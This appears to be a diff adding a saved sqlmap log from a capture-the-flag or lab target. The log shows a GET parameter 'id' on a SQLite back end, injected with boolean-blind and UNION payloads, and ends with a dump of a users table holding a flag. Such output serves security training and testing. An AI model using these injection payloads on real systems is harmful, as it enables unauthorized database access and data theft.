@@ -1,0 +1,39 @@
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8758=8758
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(113,120,118,118,113)||CHAR(101,104,86,81,86,115,69,66,88,115,112,102,67,82,107,97,77,78,104,67,65,87,72,73,117,82,117,111,68,86,111,69,79,77,112,106,69,105,84,65)||CHAR(113,122,112,113,113)-- hYtu
+---
+back-end DBMS: SQLite
+<current>
+[1 table]
++-------+
+| users |
++-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 8758=8758
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(113,120,118,118,113)||CHAR(101,104,86,81,86,115,69,66,88,115,112,102,67,82,107,97,77,78,104,67,65,87,72,73,117,82,117,111,68,86,111,69,79,77,112,106,69,105,84,65)||CHAR(113,122,112,113,113)-- hYtu
+---
+back-end DBMS: SQLite
+Database: <current>
+Table: users
+[1 entry]
++----+--------------------+----------+
+| id | secret             | username |
++----+--------------------+----------+
+| 1  | flag{super_secret} | admin    |
++----+--------------------+----------+
+
